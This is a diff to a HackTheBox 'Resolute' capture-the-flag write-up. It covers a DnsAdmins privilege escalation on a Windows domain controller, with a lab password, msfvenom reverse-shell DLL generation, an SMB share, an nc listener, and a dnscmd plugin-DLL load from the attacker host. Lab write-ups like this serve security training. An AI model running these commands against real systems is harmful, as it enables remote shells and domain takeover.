@@ -1,5 +1,7 @@
 # Hackthebox - Resolute - Windows
 
+![Resolute](../.res/HTB-resolute.png)
+
 ## Nmap
 
 ```bash
@@ -478,4 +480,50 @@ result was NT_STATUS_WRONG_PASSWORD
 ![Password ](../.res/2023-01-14-20-49-50.png)  
 - `ryan Serv3r4Admin4cc123!`
 - So we can try this password with evil-winrm as well
-![](../.res/2023-01-14-20-53-11.png)
+
+![ryan](../.res/2023-01-14-20-53-11.png)
+
+- There is a note in the desktop. Turns out akk changes will be reverted within 1 minute
+- Let's find out more about Ryan
+
+```powershell
+*Evil-WinRM* PS C:\Users\ryan\Desktop> whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID                                            Attributes
+========================================== ================ ============================================== ===============================================================
+Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
+MEGABANK\Contractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group
+MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
+NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled gr
+```
+
+- Here we can see that Ryan has 2 groups that melanie did not have DNSAdmins and Contractors
+- With some research we find this [blog](https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2) which also refers to [this one](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)  
+- We could also probably use this [tool](https://lolbas-project.github.io/lolbas/Binaries/Dnscmd/)
+- It should be here `C:\Windows\System32\Dnscmd.exe`
+- So first we need to create a malicious dll `msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 -f dll -o gabrielle.dll`
+- We serve it to the target using smbserver.py `sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support share .`
+- Let's already launch a listener `sudo rlwrap nc -nlvp 443`
+- Here is the command from the documentation on lolbas `dnscmd.exe dc1.lab.int /config /serverlevelplugindll \\192.168.0.149\dll\wtf.dll`
+- So in my case `C:\Users\ryan\Desktop> C:\Windows\System32\Dnscmd.exe /config /serverlevelplugindll \\10.10.14.5\share\gabrielle.dll`  
+
+![get dll](../.res/2023-01-21-20-08-36.png)
+
+> Do not forget to add `share` in your path I forgot and it took me a while to understand why ^_^'' 
+
+- Now we need to start and stop dns
+  - `sc.exe \\resolute stop dns`
+  - `sc.exe \\resolute star dns`
+
+- And we get a root shell  
+
+![root](../.res/2023-01-21-20-07-29.png)
